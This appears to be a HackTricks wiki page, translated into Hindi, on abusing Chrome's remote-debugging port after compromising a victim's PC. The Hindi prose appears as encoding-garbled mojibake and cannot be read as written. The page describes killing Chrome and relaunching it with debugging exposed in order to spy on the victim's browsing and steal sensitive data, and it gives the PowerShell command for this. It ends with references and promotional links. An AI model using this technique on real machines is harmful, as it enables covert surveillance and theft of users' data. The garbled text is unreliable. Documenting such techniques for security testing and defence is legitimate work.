рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдФрд░ **рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PC рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж** рдЬреЛ Chrome/Chromium рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЖрдк Chrome рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рдбреАрдмрдЧрд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдбреАрдмрдЧрд┐рдВрдЧ рдкреЛрд░реНрдЯ рдХреЛ рдкреЛрд░реНрдЯ-рдлрд╝реЛрд░рд╡рд░реНрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддрд╛рдХрд┐ рдЖрдк рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХреЗрдВред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЖрдк рд╡рд┐рдХреНрдЯрд┐рдо рджреНрд╡рд╛рд░рд╛ Chrome рдХреЗ рд╕рд╛рде рдХрд┐рдпреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХреЗрдВрдЧреЗ рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рд╕рдХреЗрдВрдЧреЗред

рдЫрд▓реАрд▓ рддрд░реАрдХрд╛ рд╣реИ **рд╣рд░ Chrome рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░рдирд╛** рдФрд░ рдлрд┐рд░ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХреЙрд▓ рдХрд░рдирд╛
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## рд╕рдВрджрд░реНрдн

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣,
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**.

</details>
